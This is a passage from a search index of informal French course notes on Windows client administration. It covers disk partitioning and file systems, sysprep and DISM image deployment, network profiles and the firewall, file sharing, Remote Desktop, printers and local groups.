livre</li> <li>il ne peut referencer que 4 partitions max.</li> <li>il ne gere que des DD inf\u00e9rieur a 2,2To</li> <li>compatible OS 32 &amp; 64bits</li> </ul> <p>Partition d'un disque de base [inserer schema cours] Possibilit\u00e9 d'\u00e9tendre une partition existante avec l'espace libre contigu possibilit\u00e9 creer 4 part. max sur un disque</p> <p>Il existe une m\u00e9thode pour aller au dela des 4 part. max., parition \u00e9tendue elle se comporte comme un contenant pouvant acceuillir des lecteurs logique (lecteur logique pouvant eux meme stock\u00e9 des donn\u00e9es), il faut un mini 1 lecteur logique pour sotcker des donn\u00e9es, il ne sont pas refe. dans le MBR (impossible de demarrer un ordinateur via un OS stock\u00e9 dans un lecteur logique)</p> <p>partitionnement de disque dynamique.</p> <ul> <li>dynamique (\u00e9volution du disque de base)</li> <li>! Attention pour MS les partitions contenues sur un Disque Dynamique s'appellent des volumes !</li> <li>possibilit\u00e9s d'\u00e9tendre un volume grace a l'espace libre disponible sur le disque source...</li> <li>..et disponible sur un disque supp. Permet de gerer les disques par ensemble (RAID)</li> <li>Convertir un disque de base en disque dynamique sans perte de donn\u00e9es</li> </ul> <p>autre Format de table de partitionnement au format GPT: decmocratise et tres repandu aujourd'hui</p> <ul> <li>GUID Partition Table</li> <li>format gomme les inconv\u00e9nients du MBR</li> <li>dupliqu\u00e9 &amp; sauvegard\u00e9 sur plusieurs secteurs du disque (contrairement au MBR)</li> <li>lecture du GPT par l'UEFI (evolution du bios depuis 2013)</li> <li>128 partitions max</li> <li>taille max 256To</li> <li>seulement compatible avec les OS 64bits et les puces UEFI</li> </ul>"},{"location":"Windows/Client/Stockage/#formatage-de-partition","title":"formatage de partition","text":"<p>apres le partitionnement vient le formatage formater une partition ou un lecteur logique, c'est installer un systeme de fichiers grave a son index le FS (files system) organise les acc\u00e8s au donn\u00e9es. une partition ou un lecteur logique format\u00e9 s'appelle un volume. en autre l'index possede l'adresse physique des donn\u00e9es situ\u00e9 sur les secteur du disk (analogie ikea on recupere l'emplacement du produit afin de le recuperer rapidement dans l'entrepot) l'OS consulte l'index pour savoir ou ce trouve la donn\u00e9e a aller chercher.</p> <p>il existe plusieurs sorte de systeme de fichiers</p> <ul> <li>NTFS :</li> <li>systeme de fichiers par d\u00e9faut chez MS (win10 ne s'install que sur du NTFS)</li> <li>nativement s\u00e9curis\u00e9 par les ACL (acces control list) l'index contient les info d'authorisation d'acces au fichier<ul> <li>qui peut le lire</li> <li>qui peut le modifier</li> <li>qui peut le supp</li> <li>qui a un acces refuser</li> </ul> </li> <li>l'OS le sauras en consultant l'index</li> <li>chiffrement int\u00e9gr\u00e9 via EFS</li> <li>compression des fichiers int\u00e9gr\u00e9e</li> <li>activation de la synchronisation et de la deduplication des donn\u00e9es via fonctionnalit\u00e9 supp</li> <li> <p>taille maximale (apres formatage en NTFS avec une taille d'allocation de secteur de 64Ko) du volume gere 256To</p> </li> <li> <p>FAT32 (file Allocation Table)</p> </li> <li>historique</li> <li>standard il est reconnu par beaucoup d'OS (ex une cles usb en fat32 sera reconnu par la pluaprt des OS ex: win to macOs)</li> <li>non s\u00e9curis\u00e9 nativement</li> <li> <p>gere que 4Go max</p> </li> <li> <p>REFS (Resilient File System):</p> </li> <li>evolution de NTFS</li> <li>reserv\u00e9 au grand espace de stockage (quasi illimit\u00e9)</li> <li> <p>correction proactive des erreurs</p> </li> <li> <p>ext4 privil\u00e9gi\u00e9 sur OS linux</p> </li> <li>VMFS Vmware</li> <li>UDF systeme de fichier pour CD/DVD, inscritible 1x la pluaprt du temps et en lecture seule une fois finalis\u00e9</li> </ul>"},{"location":"Windows/Client/Stockage/#outils-de-gestion","title":"outils de gestion","text":"<p>1- console graphique de gestion des disques (diskmgmt.msc) [possibilit\u00e9 de l'ajouter dans la console perso via les outils enfichable]</p> <ul> <li>avec la console on peut initialiser les disk (mettre en place une table de partitionnement), les partitionners, les format\u00e9, les etendres, les reduires, leurs attribuer une lettre de lecteur ... bref administrer vos volumes</li> <li>en ligne de commande via l'outil diskpart</li> <li> <p>reste un outil plus complet</p> </li> <li> <p>via powershell avec les cmdlets :</p> </li> <li>get-disk : relever le num\u00e9ro du nouveau disque</li> <li>initialize-disk -number  : par d\u00e9faut GPT - il faut pr\u00e9ciser le parametre -partitionstyle MBR pour la r\u00e9trocompatibilit\u00e9 <li>new-partition -disknumber  -useMaximumsize - assigndriveletter : ont peut assigner la lettre apres avec set-partition -disknumber  -partitionnumber  -newdriveletter lettre de votre choix <li>format-volume -driveletter lettre de lecteur : format par d\u00e9faut en NTFS - votre volume est pret a l'utilisation</li>"},{"location":"Windows/Client/Stockage/#disque-dur-virtuel","title":"disque dur virtuel","text":"<p>on utilise de plus en plus de VM donc de DD virutel</p> <p>MS dispose de son propre format format de DD virtuel, ceux utiliser dans HyperV (solution MS) ext. .VHD (Virtual hard Drive) ou .VHDX (.VMDK chez Vmware) Disk bootable donc il peuvent heberger des OS Taille fixe ou dynamique et utilisable sur une machine physique, ils sont montable sur un OS (comme pour une image .iso ) donc facilement explorable.</p> <p>1 disk virtuel est ni plus ni moins qu'un fichiers que l'on peut facilement manipuler, copier, agrandir, sauvegarder etc</p>"},{"location":"Windows/Client/capture_deploiement_images/","title":"d\u00e9ploiement d'image disque","text":""},{"location":"Windows/Client/capture_deploiement_images/#introduction","title":"Introduction","text":"<p>gain de temps et efficacit\u00e9 = productivit\u00e9 une solution de gain de productivit\u00e9 serait de tendre vers un parc informatique homogene, il est toujours plus efficace de gerer un parc de poste client &amp; serveur de meme marque = id\u00e9e utopique Tendre vers un ensemble de systeme d'exploitation homogenes pour reduire les temps de maintenance interessant (selon les budget et dans la mesure du possible) de posseder des OS \"cl\u00e9 en main\" pour les nouveaux collaborateurs et les collaborateurs avec un poste d\u00e9faillant Pour cela une solution existe = les images de r\u00e9f\u00e9rence</p>"},{"location":"Windows/Client/capture_deploiement_images/#le-master-limage-de-reference","title":"Le MASTER (l'image de r\u00e9f\u00e9rence)","text":"<p>une image de ref est un OS pret a etre demarrer, a jour et dans l'absolu possedant les logiciel de l'entreprise pret a l'emploi.</p> <p>Pour creer une image de reference il faudra</p> <ul> <li>installer l'OS</li> <li>sur un ordinateur avec une conf materiel la plus standard dans l'entreprise</li> <li>faire la config initial de l'OS</li> <li>pilote etc</li> <li>installation app de base et metier version valid\u00e9 par la DSI</li> <li>preparer le systeme a etre cloner avec l'outil natif sysprep</li> </ul>"},{"location":"Windows/Client/capture_deploiement_images/#sysprep","title":"sysprep","text":"<p>logiciel natif MS utilis\u00e9 pour rendre les postes uniques dans l'entreprise, sont but est de reinitialiser les parametre personnalis\u00e9 du MASTER. il existe une version de sysprep native par generation OS (sysprep win10 , serveur2022 etc)</p> <p>Possibilit\u00e9 de l'utilis\u00e9 via l'interface graph ou en CLI pour plus de pr\u00e9cision</p> <p>parametre n\u00e9cessaire pour bien l'utiliser:</p> <ul> <li>Interface graphique</li> </ul> <p>lancer sysprep (action de nettoyage du poste) pour ensuite rentrer en mode OOBE (out of box experience) (interaction utilisateur au red\u00e9marrage) mode permettant de rentrer les 1ere config apres le demarrage de sortie d'usine. Cocher la case generaliser etape essentiel permettant de generer un nouveau SID d'ordinateur au prochain red\u00e9marrage, chaque ordinateur du parc doit posseder un SID unique pour joindre un domaine active directory. Arreter le systeme pour capturer son image a froid (OS principal non demarr\u00e9) pour pouvoir le deployer sur un ou plusieurs ordinateur du parc</p> <ul> <li>Ligne de commande</li> </ul> <p>Il s'agit des memes etapes qu'avec l'interface graphique via l'utilitaire cmd <code>sysprep</code> suivi des options <code>/oobe</code> <code>/generalize</code> <code>/shutdown</code></p> <pre><code>c:\\windows\\system32\\sysprep\\sysprep.exe /oobe /generalize /shutdown\n</code></pre> <p>En compl\u00e9ment on pourra redemarrer le poste en mode :</p> <ul> <li>audit : redemarre le poste avant l'OOBE pour effectuer un pr\u00e9-param\u00e9trage sp\u00e9cifiques au poste (installation des soft ou drivers qui doivent etre conserv\u00e9 a l'issu du sysprep g\u00e9n\u00e9ralis\u00e9)</li> <li>journaux sysprep consultables apres redemarrage dans les r\u00e9pertoires Panther <code>c:\\Windows\\system32\\sysprep\\panther</code></li> </ul> <p>sysprep n'est pas compatible avec :</p> <ul> <li>toutes les configurations (roles serveur, jonction, etc.)</li> <li>incompatible avec des apps install\u00e9es depuis le microsoft store (apps li\u00e9 au compte utilisateur)</li> <li>pilotes install\u00e9s manuellement</li> <li>supprim\u00e9s par d\u00e9faut par sysprep</li> <li>non supprim\u00e9s avec le parametre <code>/PersistAllDeviceInstalls</code> en CLI ou les ajouter au magasin de pilote windows</li> <li>les compte utilisateur de la base SAM ne sont pas supprim\u00e9 (possibilit\u00e9 de le faire avec le compte admin avant master)</li> <li>seule le compte admin est reinitialiser par sysprep</li> <li>Activez et utilisez le compte admin pour un parametrage plus pr\u00e9cis</li> </ul>"},{"location":"Windows/Client/capture_deploiement_images/#exploitation-dun-master","title":"Exploitation d'un master","text":"<p>une fois le systeme de reference eteint, cad une fois le sysprep realiser, ne pas redemarrer le poste de reference avant d'avoir capturer l'image cr\u00e9e par sysprep.</p> <p>Si redemarrage du poste de ref avant capture de l'image cela annule le sysprep et oblige a en refaire 1</p> <p>Capture de l'image en demarrant l'ordinateur en le faisant booter sur un autre OS (un OS permettant de creer, de conserver et d'exporter l'image du master) 2 possibilit\u00e9s :</p> <ol> <li>boot via la carte reseau en amorcage PXE (Pre-boot eXecution Environment). la carte reseau ira chercher un OS sur un serveur dedi\u00e9 a cela (serveur de deploiement) via un automatisme ce chargera de capturer le systeme de l'ordinateur pour la transferer en image .VIM. cela permet en general d'archiver des images qui sera possible de deployer sur des postes cibles afin de gagner du temps et de ne pas avoir a installer windows manuellement.</li> <li>Boot sur un support WinPE amor\u00e7able (DVD,Cl\u00e9 USB,etc), WinPE pour windows Preinstallation Environment est un mini OS en CLI qui possede plusieurs outils en lien avec la capture et le deploiement d'image. sa commande principale est DISM (deploiment image service and mangement tool)</li> </ol> <p>une fois l'image capturer et en notre possesion il est possible de la mettre a jour en mode offline avec la cmd dism. (possibilit\u00e9 d'integrer des KB, des logiciels, des drivers)</p> <p>possibilit\u00e9 en amont que le poste cible est pret a recevoir l'OS en le testant et en validant sa config materiel en fonction des prerequis de l'OS. certain utilitaire gratuit existe sur le site de MS. s'assurer que le poste cible possede un volume pret a acceuillir les fichiers du futur systeme. WinPE possede des outils tels que (diskpart, mount, powershell, netuse, bcdedit,bdcboot...)</p>"},{"location":"Windows/Client/capture_deploiement_images/#deploiement-dune-image","title":"Deploiement d'une image","text":"<p>en possesion de l'image .vim possibilit\u00e9 de la deployer via le serveur de deploiement. Pratique pour faire du deploiement de masse, celui-ci s'occupe de l'installation et de la validation des nouveaux ordinateur celui-ci s'en charge pour rendre les ordinateurs pret a l'emploi. Pour connaitre un deploiement par le serveur les ordinateurs cible devront booter sur le reseau, se connecter au serveur, choisir l'image de reference qui sera deployer</p> <p>sans serveur il est possible de faire un deploiement au cas par cas via le suppor bootable winPE et a la cmd DISMil faudra d'abord creer le volume d'acceuil qui hebergera le contenu de l'image VIM</p>"},{"location":"Windows/Client/carte_et_emplacement_reseau/","title":"Reseau Windows","text":"<p>Centre reseau et partage permet de configurer le comportement du systeme sur le reseau</p> <ul> <li>accesible depuis l'icone reseau de la barre de notification</li> <li>parametre reseau et internet &gt; Centre r\u00e9seau et partage</li> <li>accessible depuis le panneau de configuration</li> <li>reseau et internet &gt; centre r\u00e9seau et partage</li> </ul> <p>Donne des indications sur :</p> <ul> <li>la connectivit\u00e9 du poste</li> <li>les connexions r\u00e9seau d\u00e9tect\u00e9es (si le poste possede plusieurs carte rsx)</li> <li>les profils r\u00e9seau et les emplacements associ\u00e9s aux cartes</li> </ul> <p>il permet de configurer \u00e9galement des fonctionnalit\u00e9s de partage ainsi que les cartes rsx</p> <p>une carte rsx est associ\u00e9 a un profil pr\u00e9d\u00e9fini (nomm\u00e9 egalement emplacement rsx) le profil sert en priorit\u00e9 a ce que le pare-feu s'adapte a l'emplacement ou l'on ce connecte (pratique dans un contexte de mobilit\u00e9)</p> <p>[inserer screen support cours] 1er emplacement pr\u00e9sent\u00e9 :</p> <ul> <li>R\u00e9seau Priv\u00e9 =</li> <li>rsx de confiance</li> <li>connectivit\u00e9 maitris\u00e9</li> <li>s\u00e9curis\u00e9</li> <li>pare feu s'adapte et laisse passer la quasi totalit\u00e9 des communications</li> </ul> <p>Emplacement</p> <ul> <li>rsx avec domaine</li> <li>emplacement avec plus de confiance</li> <li>le pare feu laissera passer plus de  communication notamment avec le controleur de domaine ainsi qu'avec les machines joint au domaine</li> <li>profil non modifiable une fois l'ordinateyr joint au domaine de l'entreprise</li> </ul> <p>Emplacement</p> <ul> <li>resau public</li> <li>rsx ouvert a tous et donc plus risqu\u00e9 moins sur</li> <li>le pare-feu vas bloquer la quasi totalit\u00e9 des communications</li> <li>profil appliquer automatiquement si aucune passerelle par d\u00e9faut ou lorsqu'aucun domaine n'est detect\u00e9</li> <li>activation manuel possible si on decide de rendre l'ordinateur invisible sur le reseau</li> </ul>"},{"location":"Windows/Client/carte_et_emplacement_reseau/#config-de-la-carte-reseau","title":"Config de la carte r\u00e9seau","text":"<p>acces depuis panneau de config ou centre r\u00e9seau et partage ncpa.cpl meilleurs moyen d'y acceder</p> <p>mode statique:</p> <ul> <li>en renseignant manuellement</li> <li>adresse IP</li> <li>masque de sous-rsx</li> <li>passerelle</li> <li>serveur DNS</li> </ul> <p>mode dynamique</p> <ul> <li>fourni par:</li> <li>serveur DHCP</li> <li>service APIPA<ul> <li>nativement pr\u00e9sent et op\u00e9rationnel sur lessysteme windows permet de fournir une configuration temporaire (si aucun serveur dhcp n'est joignable)</li> <li>169.254.0.0 /16</li> <li>permet de communiquer, uniquement, avec les autres machines du rs local adress\u00e9 en APIPA</li> </ul> </li> </ul>"},{"location":"Windows/Client/carte_et_emplacement_reseau/#outil-permettant-le-bon-fonctionnement-de-la-carte-et-dinvestiger","title":"outil permettant le bon fonctionnement de la carte et d'investiger","text":"<p>graphiquement :</p> <ul> <li>zone de notification (etat de la connexion)</li> <li>centre rsx et partage</li> <li>assistant resoudre les problemes : orient\u00e9 utilisateur</li> </ul> <p>invite de commande : plus pr\u00e9cis &amp; plus efficace</p> <ul> <li>ipconfig: afficher la configuration et interargir avec la pile reseau (DNS/DHCP)</li> <li>arp: agit sur le cache arp</li> <li>ping: test de la connectivit\u00e9 rs</li> <li>tracrt: utilise (comme pour <code>ping</code>) le protocole icmp qui affiche l'itineraire d'un paquet</li> <li>netstat: verification de la couche 4</li> <li>nslookup: verif et diagnostic de la resolution de nom.</li> </ul>"},{"location":"Windows/Client/carte_et_emplacement_reseau/#quest-ce-quun-pare-feu-et-pourquoi-en-utiliser","title":"qu'est ce qu'un pare-feu et pourquoi en utiliser ?","text":"<p>windows embarque nativement un pare-feu afin de se proteger de l'exterieur le pare-feu est un service qui observe et filtre les com rsx entrante et sortante du systeme. c'est un service qui permet au system d'etre protege contre les acces non autoris\u00e9. oar d\u00e9faut le pare-feu est activ\u00e9, il bloque certaine connexion en entr\u00e9e et laisse passer les connexions sortante.le pare-feu est compos\u00e9 de regle pr\u00e9d\u00e9fini porpos\u00e9 par le systeme.</p> <p>Ces regles pr\u00e9d\u00e9finis sont facilement activable depuis les console de gestion et s'adapte en fonction du profil rsx detect\u00e9. possibilit\u00e9 de cr\u00e9er des regles personnalis\u00e9.</p> <p>Le pare-feu win comporte 3 nx de configuration: [inclure screen cours]</p> <ol> <li>(Utilisateur)permet d'activer ou de desactiver totalement le fonctionnement du pare-feu par profil rsx</li> <li>depuis le composant verifier l'etat du pare-feu pour l'activation/desactivation</li> <li>(programme)plus pr\u00e9cis que le 1er, authorise granulairement le traffic genere par une app particuliere, il suffit de selectionner l'app dans la list et de lui laisser la possibilit\u00e9 de generer du flux rsx</li> <li>avec la fonction autoriser une application via le pare-feu windows: fournit un ensemble de regles generiques activ\u00e9es automatiquement et param\u00e9trables</li> <li>permet de gerer les regles entrante et sortante de maniere plus pr\u00e9cise encore, possibilit\u00e9 de filtrer le traffic entrante en fonction des adresse IP source ou en fonction des ports de destination. Pour ca des regles pr\u00e9d\u00e9fini peuvent ou aider ou creer nos propre regle.</li> <li>avec la console Pare-feu windows defender avec fonctions avanc\u00e9es de s\u00e9curit\u00e9: donne acces au param\u00e9trage detaille de l'ensemble des regles, permet egalement d'afficher une vue globale des regles acitv\u00e9es</li> </ol> <p>accesible depuis le panneau de config ou via firewall.cpl.</p>"},{"location":"Windows/Client/principes_du_partage/","title":"les principes du partage","text":"<ul> <li>permet d'acceder a une ressource</li> <li>heberg\u00e9e par un serveur</li> <li>depuis un systeme d'exploit client</li> <li>en passant a travers le reseau</li> </ul> <p>il y a 4 elements essentiel derriere un partage:</p> <ol> <li>la ressource</li> <li>le serveur</li> <li>le client</li> <li>le reseau</li> </ol>"},{"location":"Windows/Client/principes_du_partage/#quest-ce-quune-ressource","title":"qu'est ce qu'une ressource ?","text":"<p>les ressources accessible depuis le reseau sont des fichiers (via le partagee de dossier, d'arborescence ou de volume entier et des imprimante)(def. MS d'une resrouce partageable) Les serveurs qui herberge ces ressources peuvent etre:</p> <ul> <li>OS client (win10)</li> <li>OS serveurs (Win serveur)</li> <li>copieur</li> <li>une tablette</li> <li>un smartphone</li> <li>tout hote possedant des ressources et une carte reseau les clients qui peuvent acceder a une ressource partag\u00e9e tout type de systeme connect\u00e9 au r\u00e9seau peut acceder aux ressources partag\u00e9es</li> <li>Serveur</li> <li>poste client fixe ou portable</li> <li>copieur</li> <li>tablette</li> <li>...</li> </ul>"},{"location":"Windows/Client/principes_du_partage/#qui-peut-partager","title":"Qui peut Partager ?","text":"<p>partager = modifier le systeme. il faudra donc des privileges d'aministration</p>"},{"location":"Windows/Client/principes_du_partage/#qui-a-acces-au-partage","title":"qui a acces au partage ?","text":"<p>on partage les ressources au seules personne concern\u00e9es</p> <ul> <li>une authentification est requise (compte local, du domaine)</li> <li>3 nivx d'acces sont d\u00e9finis sur la ressource partag\u00e9e</li> <li>lecture</li> <li>Modifier</li> <li>controle total</li> <li>2 v\u00e9rification d'identit\u00e9s sont effectu\u00e9es</li> <li>au niveau du partage</li> <li>au niveau des droits NTFS</li> <li>les autorisations du partage sont restrictives ex: l'utilisateur \"john\" a l'autorisation en lecture au niveau du partage et la modification au nx des droits NTFS, il n'aura au final droit qu'a un droit de lecture car les droits du partage sont restrictif</li> </ul>"},{"location":"Windows/Client/principes_du_partage/#comment-acceder-aux-fichiers-partages-depuis-win10","title":"Comment acceder aux fichiers partag\u00e9s depuis win10 ?","text":"<ul> <li>momentanement depuis l'explorateur windows via le chemin UNC (Uniform Naming Convention) \\serveur(nom ou IP)\\nom_du_partage</li> <li>durablement en montant un lecteur reseau via la fonctionnalit\u00e9 connecter un lecteur reseau (accessible dans explorateur windows via une lettre de lecteur)</li> <li>les lecteurs mapp\u00e9s sont memoris\u00e9s avec le profil utilisateur et dispo des l'ouverture de session</li> <li>en ligne de commande en utilisant</li> <li>net use x:[UNC]</li> <li>commande net view liste les partages</li> <li>En Powershell avec la cmdlets:</li> <li>New-SmbMapping (ex: new-smbmapping -localpath 'R:' -remotepath '\\SRV-FIC\\compta')</li> </ul>"},{"location":"Windows/Client/principes_du_partage/#comment-partager-des-ressources-depuis-un-serveur","title":"Comment partager des ressources depuis un serveur ?","text":"<p>! Bonne pratique : toujours passer par le partage avanc\u00e9... !</p> <p>Avec l'explo windows depuis les propri\u00e9t\u00e9 du dossier [onglet partage] Partager... puis le menu d\u00e9roulant \"accorder l'acces \u00e0...\" ainsi que le bouton partager[avec bouclier] correspond a la mise en place de partage de base (orient\u00e9 utilisateur) simplifi\u00e9 et automatique [a eviter] Partage avanc\u00e9 onglet partage depuis les propri\u00e9t\u00e9s du conteneur par d\u00e9faut l'entit\u00e9 tout le monde possede un acces en lecture.</p> <ul> <li>bonne pratique: pour la s\u00e9cu, supprimer l'entit\u00e9 tout le monde car elle contient le groupe \"invit\u00e9\" &amp; l'utilisateur \"invit\u00e9\" a la place ajout de l'entite \"utilisateur authentifi\u00e9s\", les droits du partage \u00e9tant restrictif il faut accorder l'acces en controle total pour les \"utilisateurs authentifi\u00e9s\".</li> <li>Aucun danger a mettre en controle total car affinages des authorisations d'acces avec les droits NTFS de la ressources</li> </ul> <p>depuis le composant mmc avec l'outil enfichable dossiers partages (fsmgmt.msc)</p> <ul> <li>lister les partages</li> <li>creer des nouveaux (assistant de creation)</li> <li>vues sessions et fichiers ouvert (id utilisateur actuellement connect\u00e9 aux partages et liste en tps reel les fichiers ouvert par les utilisateurs)</li> <li>affichage des partages administratif generes automatiquement par le systeme, a l'installation du systeme ou a l'ajout d'un nx volume(nom terminant par $) ils sont cach\u00e9 et n'apparaissent pas sur le rsx, seul le compte admin peut y acceder</li> </ul> <p>depuis l'invite de commande</p> <ul> <li>net share pour lister et configurer les partages</li> <li>ex: net share commun=d:\\note_de_service /grant:\"utilisateur authentifi\u00e9s\",FULL [bonne pratique donn\u00e9es l'acces aux utilisateurs authentifi\u00e9s en controle total |droit restrictif de partage | droit ajuste avec la securit\u00e9 NTFS]</li> </ul> <p>en powershell avec la cmdlets new-smbshare   ex: new-smbshare -name \"VSMFiles\" -path \"c:\\ClusterStorage\\Volume1\\VMFiles\" -FullAccess \"authenticated users\" [bonne pratique donn\u00e9es l'acces aux utilisateurs authentifi\u00e9s en controle total |droit restrictif de partage | droit ajuste avec la securit\u00e9 NTFS]</p>"},{"location":"Windows/Client/principes_du_partage/#session-a-distance","title":"Session \u00e0 distance","text":"<p>Acces distant au poste :</p> <ul> <li>possible grace a la fonctionnalit\u00e9 bureau \u00e0 distance</li> <li>Authentification avec un compte valide (local ou de domaine)</li> <li>Necessite des privileges specifiques</li> <li>meme nivx de fonctionnement qu'une session locale</li> </ul> <p>Utlisation courante :</p> <ul> <li>Maintenir des postes (1 seule session locale ou distante)</li> <li>Acceder a distance aux serveurs (2 sessions simultan\u00e9es depuis windows 2008)</li> <li>Acceder a son environnement de travail depuis l'exterieur (VPN Virtual Private Network)</li> </ul> <p>Les Limites</p> <ul> <li>Mode maintenance sur un poste client (pas d'interaction possible avec l'utiliateur) 1 session locale ou distante ce qui ne permet pas de faire du depannage en tps reel avec l'utilisateur</li> <li>sur les serveurs, 2 sessions avec des comptes differents</li> <li>blocage (a distance) si les sessions restent ouvertes Pour le support utilisateur (aide, depannage en tps reel) d'autre solution sont disponible:</li> <li>teamviewer</li> <li>vnc</li> <li>Microsoft remote assistance (nativement sur les OS)</li> </ul> <p>Pour ce connecter a plus de 2 en simultan\u00e9 sur un serveur il faut activer le role MS RDS (Remote desktop service)</p>"},{"location":"Windows/Client/principes_du_partage/#comment-ce-connecter-a-distance-sur-un-poste-win10","title":"Comment ce connecter \u00e0 distance sur un poste win10","text":"<p>via l'outil natif connexion bureau a distance</p> <ul> <li>Ensemble d'onglets pour personnaliser la connexion</li> <li>sauvegarder les parametres</li> <li>Mappez vos ressources locales sur le poste client</li> <li>cles usb</li> <li>imprimante</li> <li>presse-papier pour faire du copy/paste du distant vers la machine local</li> </ul> <p>accessible via la commande mstsc</p>"},{"location":"Windows/Client/principes_du_partage/#config-du-poste-cible-celui-ou-lon-veut-prendre-la-main","title":"config du poste cible (celui ou l'on veut prendre la main)","text":"<p>activation de la fonctionnalit\u00e9 via l'onglet utilisation a distance dans les param syste avance de windows.</p> <ul> <li>Rubrique systeme du panneau de conf</li> <li>Parametres systemes avanc\u00e9s</li> <li>onglet Utilisation a distance</li> </ul> <p>! La fonct\u00b0 est nativement desactiv\u00e9e pour des raisons de s\u00e9curit\u00e9.! 2 nvx d'identification/authentification sont disponible pour ouvrir une session sur un bureau distant</p> <ol> <li>Authentification Standard : compatible avec tous type de logiciel client bureau a distance</li> <li>Authentification NLA (Network Level Authentication): bas\u00e9 sur uen double authentification</li> <li>sur le reseau avant de ...</li> <li>s'authentifier sur la machine distante le client connexion bureau a distance est compatible avec ce niveau d'authentification</li> </ol> <p>Par defaut seule les administrateur sont autoris\u00e9 a ouvrir une session distante. Possibilit\u00e9 de donner l'acces a d'autre utilisateur via le groupe pr\u00e9d\u00e9finis Utilisateur du bureau a distance</p>"},{"location":"Windows/Client/principes_du_partage/#mecanisme-de-fonctionnement","title":"mecanisme de fonctionnement","text":"<p>l'interaction entre la machne local et la machine distante ce fait via le Protocole RDP (Remote desktop protocol) en \u00e9coute sur le ports 3389. ce protocole envoi les mouvements de souris et les frappes clavier puis recupere le raffraichissement d'affichage de la machine distante. la fonctionnalit\u00e9 ouvre automatiquement les acces dans le pare-feu</p> <p>les rsx sont les fondations des systemes d'information des entreprises. Ils sont indispensable, les services s'appuie sur le rsx pour etre accessible a tous. les OS clients ont pour objectif principal d'acceder au services de lentreprise grace a un rsx. Il est donc naturel de securis\u00e9 ces acces via, entre autre, des demandes d'authentification</p>"},{"location":"Windows/Client/windows_imprimantes/","title":"Gestion des imprimantes avec windows","text":"<p>definition de notion uatour des imprimante:</p> <ul> <li>P\u00e9ripherique d'impression : le mat\u00e9riel = moteur permettant de sortir une feuille blanche a partir d'une feuille blanche</li> <li>Imprimante : le logiciel = envoie l'ordre d'impression au p\u00e9riph\u00e9rique d'impression               - pilote gere le peripherique               - configuration (specifique/pardefaut) imprime en recto/verso etc.               - file d'attente d'impression (dans laquel s'enchaine 1 a 1 les tx d'impressions)               - port d'impression derriere lequel est reli\u00e9 le peripherique d'impression</li> <li>File d'attente d'impression : Service spourleur = conversion num\u00e9rique du document (image, doc txt) dans un langage brut/electronique interpr\u00e9table par le peripherique d'impression. envoi du job 1 a 1 vers le port d'impression</li> <li>Imprimante locale : P\u00e9riph\u00e9rique d'impression directement reli\u00e9 a l'ordinateur via un port local (USB)</li> <li>imprimante partag\u00e9e : imprimante locale partag\u00e9e sur le reseau grace a l'OS de l'ordinateur, Disponible si et seulement si l'ordinateur est allum\u00e9 car celle-ci est partag\u00e9e via l'OS.</li> <li>imprimante r\u00e9seau : Imprimante ind\u00e9pendante. Possede son propre OS, sa propre interface r\u00e9seau, un service web pour la configuration via une interface web dispo depuis le navigateur</li> </ul>"},{"location":"Windows/Client/windows_imprimantes/#utilisation-et-configuration","title":"Utilisation et configuration","text":""},{"location":"Windows/Client/windows_imprimantes/#imprimante-locale","title":"Imprimante locale","text":"<p>Elles peuvent etre reconnu directement par le systeme si un pilote generique est disponible dans le magasin de pilote windows, pour beneficier de toutes les fonctionnalit\u00e9s du peripheriques il faudra installer le pilote sign\u00e9 du fabricant (pour rappel les pilotes generique ne disposent, g\u00e9n\u00e9ralement, que des fonctionnalit\u00e9es de base) Les imprimantes possedent leurs propre parametre de s\u00e9curit\u00e9 NTFS, en fonction des besoins on pourra autoriser, refuser des actions sur celles-ci     - simple impression (possibilit\u00e9 d'integrer un document dans la fil d'attente)     - gestion des documents (gerer la fil d'attente)     - gerer l'imprimante : deleguer le controle a un membre de l'entreprise qui n'est pas forcement technicien ou admin info les imprimantes locale peuvent etre visualiser et gerer depuis le panneau de configuration depuis celui-ci vous avez la possibilit\u00e9 de</p> <ul> <li>visualiser la file d'attente</li> <li>definir une imprimante par d\u00e9faut</li> <li>editer ses propri\u00e9t\u00e9s (nom, emplacement physique)</li> <li>gerer les options avanc\u00e9s (plage horaire d'utilisation etc.)</li> </ul> <p>Possibilit\u00e9 de les partager (via l'onglet partage) grace au reseau et grace a l'ordinateur local (si allum\u00e9 et disponible) et d'y acceder via le chemin UNC.</p>"},{"location":"Windows/Client/windows_imprimantes/#imprimante-et-le-reseau","title":"Imprimante et le r\u00e9seau","text":"<p>En entreprise les imprimantes sont g\u00e9n\u00e9ralement raccord\u00e9 sur le reseau de celle-ci. Pour cela il y a la possibilit\u00e9 de rajouter le role de serveur d'impression sur un serveur Ce role permet de :</p> <ul> <li>centraliser tous les partages,</li> <li>les logs</li> <li>informations d'utilisation des toners et des bacs de feuille</li> <li>etc</li> </ul> <p>il permet de gerer l'ensemble desz imprimantes reseaux, et d'en simplifier l'acces et la maintenance.</p> <p>Depuis un poste client afin de beneficier d'un service d'impression il faudra y acceder via son chemin UNC (comme pour tous partage reseau) Le serveur proposera la liste des imprimantes de l'entreprise, il suffira d'effectuer un clic droit puis connecter afin de li\u00e9 le poste local et l'imprimante.</p>"},{"location":"Windows/Client/windows_imprimantes/#service-spouleur-dimpression","title":"Service Spouleur d'impression","text":"<p>Il s'agit du point centrale d'une imprimante ! C'est un programme, un service, qui traite la file d'attente. Il envoi les travaux 1 par 1 au peripherique d'impression.</p> <p>Pour permettre au service spouleur de travailler efficacement, lorsque qu'une imprimante est tres sollicit\u00e9, lorsqu'une file d'attente est tres charg\u00e9es, nous aurons la possibilit\u00e9 de creer un Pool d'impression Cela permet de creer une liaison entre une imprimante et plusieurs peripheriques d'impression, le spouleur aura donc la possibilit\u00e9 de diviser par 2, 3 ou 4 le temps de traitement des travaux de la file d'attente, ces memes travaux seront partag\u00e9s sur tous les periph\u00e9riques d'impression pr\u00e9sent dans le pool</p>"},{"location":"Windows/Client/Groupe_utilisateurs/groupes/","title":"Gestion des groupes","text":"<p>tout utilisateur doit appartenir a au moins 1 groupe pour utiliser le systeme les groupes sont identifi\u00e9 par le systeme grace a un SID (Security IDentifier) lorsqu'un utilisateur est ajout\u00e9 a un groupe, le SID du groupe enrichi le jeton d'acces de l'utilisateur.</p> <p>!un jeton d'acces c'est l'ensemble des SID associ\u00e9 a un utilisateur, le jeton d'acces contient alors le SID de l'utilisateur mais aussi l'ensemble des SID de tous les groupes auquel appartient l'utilisateur !</p>"},{"location":"Windows/Client/Groupe_utilisateurs/groupes/#categorie-de-groupes","title":"cat\u00e9gorie de groupes","text":"<p>Groupes locaux Permet majoritairement au 